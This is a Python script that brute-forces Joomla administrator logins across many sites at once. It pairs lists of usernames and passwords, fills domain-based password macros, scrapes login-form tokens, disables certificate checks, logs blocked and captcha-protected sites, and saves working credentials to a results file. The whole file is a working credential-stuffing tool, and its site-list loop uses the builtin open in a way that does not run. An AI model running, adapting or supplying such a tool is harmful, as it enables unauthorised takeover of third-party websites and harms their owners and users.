# -*- coding: utf-8 -*-

import asyncio
import contextlib
from re import match
from ssl import SSLError
from urllib.parse import urlsplit

from aiofiles import open as afile
from aiohttp import ClientSession
from async_timeout import timeout as ftime
from bs4 import BeautifulSoup


@contextlib.contextmanager
def silent_out():
    loop = asyncio.get_event_loop()
    old_handler = loop.get_exception_handler()
    old_handler_fn = old_handler

    def ignore_exc(_loop, ctx):
        exc = ctx.get('exception')

        if isinstance(exc, SSLError):
            return

        old_handler_fn(loop, ctx)

    loop.set_exception_handler(ignore_exc)

    try:
        yield
    finally:
        loop.set_exception_handler(old_handler)


async def Parse(text, user, passw):
    try:
        params = {
            'username': user,
            'passwd': passw,
            'option': 'com_login',
            'task': 'login'
        }

        a = BeautifulSoup(text, features="html.parser")

        try:
            b = a.find('fieldset', {'class': 'loginform'})
            c = b.find_all('input', {'type': 'hidden'})
        except:
            b = a.find('form', {'id': 'form-login'})
            c = b.find_all('input', {'type': 'hidden'})

        for item in c:
            if item['name'] == 'return':
                params['return'] = item['value']

        params[c[len(c)-1]['name']] = c[len(c)-1]['value']

        try:
            c = b.find_all('select', {'name': 'lang'})
            params['lang'] = ''
        except:
            pass

        return params
    except:
        return


async def macros_check(p, u, s):
    pattern = r'^(.+?)(?=\.)'
    a = (urlsplit(u).hostname).replace('www.', '')
    a = match(pattern, a)[0]

    p = p.replace('%DOMAIN%', a.upper())
    p = p.replace('%Domain%', a.capitalize())
    p = p.replace(r'%domain%', a.lower())

    if s == '':
        return p

    p = p.replace(r'%username%', s.lower())
    p = p.replace('%Username%', s.capitalize())
    p = p.replace('%USERNAME%', s.upper())

    return p


async def save(where, what):
    async with afile(f'rez/{where}.txt', 'a',
                     encoding='utf-8', errors='ignore') as f:
        await f.write(what + '\n')


async def first(s, url):
    async with s.get(url, ssl=False) as r:
        return [await r.text(), r.status]


async def second(s, url, data):
    async with s.post(url, data=data, ssl=False) as r:
        return [await r.text(), r.status]


async def valid(status, text, url):
    if 'IP address has been blocked' in text or status == 403:
        await save('block', url)
        return False
    elif 'content="Joomla' not in text or status == 400:
        return False
    elif '"captcha' in text:
        await save('captcha', url)
        return False
    else:
        return True


async def Joomla(link, user, passw):
    global finished, good

    user = await macros_check(user, link, '')
    passw = await macros_check(passw, link, user)

    try:
        async with ftime(timeout):
            with silent_out():
                async with ClientSession() as s:
                    data = await first(s, link)
                    assert await valid(data[1], data[0], link) is True

                    _post = await Parse(data[0], user, passw)
                    assert _post is not None

                    data = await second(s, link+'/index.php', _post)
                    assert '&amp;task=logout&amp' in data[0]

                    good += 1
                    await save('good', f'{link} - {user}:{passw}')
    except:
        pass
    finally:
        finished += 1
        print(f'Good: {good}; Done: {finished}', end='\r')
        return


async def main():
    tasks = []

    async with afile("data/u.txt", encoding="utf-8",
                     errors="ignore") as users:
        async for user in users:
            async with afile("data/p.txt", encoding="utf-8",
                             errors="ignore") as passws:
                async for passw in passws:
                    async with open("data/s.txt", encoding="utf-8",
                                    errors="ignore") as sites:
                        async for site in sites:
                            task = asyncio.create_task(
                                Joomla(
                                    site.replace('\n', ''),
                                    user.replace('\n', ''),
                                    passw.replace('\n', '')
                                )
                            )
                            tasks.append(task)

                            if len(tasks) >= threads:
                                await asyncio.gather(*tasks)
                                tasks = []


if __name__ == "__main__":
    good = 0
    finished = 0
    threads = int(input('Threads: '))
    timeout = int(input('Timeout (per site): '))

    asyncio.run(main())
